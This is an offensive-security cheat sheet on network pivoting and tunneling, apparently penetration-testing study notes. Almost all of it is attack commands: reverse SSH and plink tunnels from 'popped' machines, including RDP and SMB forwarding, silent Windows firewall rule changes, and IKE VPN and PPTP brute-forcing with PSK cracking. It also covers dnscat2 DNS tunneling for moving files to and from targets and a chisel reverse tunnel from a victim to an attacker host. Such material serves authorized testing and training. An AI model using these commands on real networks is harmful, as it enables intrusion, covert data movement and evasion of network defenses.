# [](#networking-pivoting-and-tunneling)Networking, Pivoting and Tunneling

*   Port Forwarding - accept traffic on a given IP address and port and redirect it to a different IP address and port

    *   `apt-get install rinetd`

    *   `cat /etc/rinetd.conf`

            # bindadress bindport connectaddress connectport
            w.x.y.z 53 a.b.c.d 80

*   SSH Local Port Forwarding: supports bi-directional communication channels

    *   `ssh <gateway> -L <local port to listen>:<remote host>:<remote port>`
*   SSH Remote Port Forwarding: Suitable for popping a remote shell on an internal non routable network

    *   `ssh <gateway> -R <remote port to bind>:<local host>:<local port>`
*   SSH Dynamic Port Forwarding: create a SOCKS4 proxy on our local attacking box to tunnel ALL incoming traffic to ANY host in the DMZ network on ANY PORT

    *   `ssh -D <local proxy port> -p <remote port> <target>`
*   Proxychains - Perform nmap scan within a DMZ from an external computer

    *   Create reverse SSH tunnel from Popped machine on :2222

        `ssh -f -N -T -R22222:localhost:22 yourpublichost.example.com` `ssh -f -N -R 2222:<local host>:22 root@<remote host>`

    *   Create a Dynamic application-level port forward on 8080 thru 2222

        `ssh -f -N -D <local host>:8080 -p 2222 hax0r@<remote host>`

    *   Leverage the SSH SOCKS server to perform Nmap scan on network using proxy chains

        `proxychains nmap --top-ports=20 -sT -Pn $ip/24`

*   HTTP Tunneling

    `nc -vvn $ip 8888`

*   Traffic Encapsulation - Bypassing deep packet inspection

    *   http tunnel  
        On server side:  
        `sudo hts -F <server ip addr>:<port of your app> 80` On client side:  
        `sudo htc -P <my proxy.com:proxy port> -F <port of your app> <server ip addr>:80 stunnel`
*   Tunnel Remote Desktop (RDP) from a Popped Windows machine to your network

    *   Tunnel on port 22

        `plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>`

    *   Port 22 blocked? Try port 80? or 443?

        `plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P80`

*   Tunnel Remote Desktop (RDP) from a Popped Windows using HTTP Tunnel (bypass deep packet inspection)

    *   Windows machine add required firewall rules without prompting the user

    *   `netsh advfirewall firewall add rule name="httptunnel_client" dir=in action=allow program="httptunnel_client.exe" enable=yes`

    *   `netsh advfirewall firewall add rule name="3000" dir=in action=allow protocol=TCP localport=3000`

    *   `netsh advfirewall firewall add rule name="1080" dir=in action=allow protocol=TCP localport=1080`

    *   `netsh advfirewall firewall add rule name="1079" dir=in action=allow protocol=TCP localport=1079`

    *   Start the http tunnel client

        `httptunnel_client.exe`

    *   Create HTTP reverse shell by connecting to localhost port 3000

        `plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P 3000`

*   VLAN Hopping

    *   <div class="highlight highlight-source-shell">

        <pre>git clone https://github.com/nccgroup/vlan-hopping.git  
        chmod 700 frogger.sh  
        ./frogger.sh</pre>

        </div>

*   VPN Hacking

    *   Identify VPN servers:  
        `./udp-protocol-scanner.pl -p ike $ip`

    *   Scan a range for VPN servers:  
        `./udp-protocol-scanner.pl -p ike -f ip.txt`

    *   Use IKEForce to enumerate or dictionary attack VPN servers:

        `pip install pyip`

        `git clone https://github.com/SpiderLabs/ikeforce.git`

        Perform IKE VPN enumeration with IKEForce:

        `./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic`

        Bruteforce IKE VPN using IKEForce:

        `./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1` Use ike-scan to capture the PSK hash:

        <div class="highlight highlight-source-shell">

        <pre>ike-scan  
        ike-scan TARGET-IP  
        ike-scan -A TARGET-IP  
        ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key  
        ike-scan –M –A –n example<span class="pl-cce">\_</span>group -P hash-file.txt TARGET-IP</pre>

        </div>

        Use psk-crack to crack the PSK hash

        <div class="highlight highlight-source-shell">

        <pre>psk-crack hash-file.txt  
        pskcrack  
        psk-crack -b 5 TARGET-IPkey  
        psk-crack -b 5 --charset=<span class="pl-s"><span class="pl-pds">"</span>01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz<span class="pl-pds">"</span></span> 192-168-207-134key  
        psk-crack -d /path/to/dictionary-file TARGET-IP-key</pre>

        </div>

*   PPTP Hacking

    *   Identifying PPTP, it listens on TCP: 1723  
        NMAP PPTP Fingerprint:

        `nmap –Pn -sV -p 1723 TARGET(S)` PPTP Dictionary Attack

        `thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst`

*   Port Forwarding/Redirection

*   PuTTY Link tunnel - SSH Tunneling

    *   Forward remote port to local address:

        `plink.exe -P 22 -l root -pw "1337" -R 445:<local host>:445 <remote host>`

*   SSH Pivoting

    *   SSH pivoting from one network to another:

        `ssh -D <local host>:1010 -p 22 user@<remote host>`

*   DNS Tunneling

    *   dnscat2 supports “download” and “upload” commands for getting iles (data and programs) to and from the target machine.

    *   Attacking Machine Installation:

        <div class="highlight highlight-source-shell">

        <pre>apt-get update  
        apt-get -y install ruby-dev git make g++  
        gem install bundler  
        git clone https://github.com/iagox86/dnscat2.git  
        <span class="pl-c1">cd</span> dnscat2/server  
        bundle install</pre>

        </div>

    *   Run dnscat2:

            ruby ./dnscat2.rb  
            dnscat2> New session established: 1422  
            dnscat2> session -i 1422

    *   Target Machine:  
        [_https://downloads.skullsecurity.org/dnscat2/_](http://web.archive.org/web/20171113221652/https://downloads.skullsecurity.org/dnscat2/)

        [_https://github.com/lukebaggett/dnscat2-powershell/_](http://web.archive.org/web/20171113221652/https://github.com/lukebaggett/dnscat2-powershell/)

        `dnscat --host <dnscat server ip>`
*   Chisel

    * Chisel is a fast TCP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. What that means is that I can run a server on my attacking machine, and then connect to it from target boxes or vice versa. On making that connection, I can define different kinds of tunnels I want to set up.
    * Typical use. Example assumes attacking machine (server) is 10.10.14.3, victim machine (client) is running from 10.10.10.10.

      Start server listening on 9002:

      `./chisel server --reverse --port 9002`

      From victim:

      `./chisel client 10.10.14.3:9002 R:3306:127.0.0.1:3306`

      We can now access MySQL (3306) from our attacking machine.
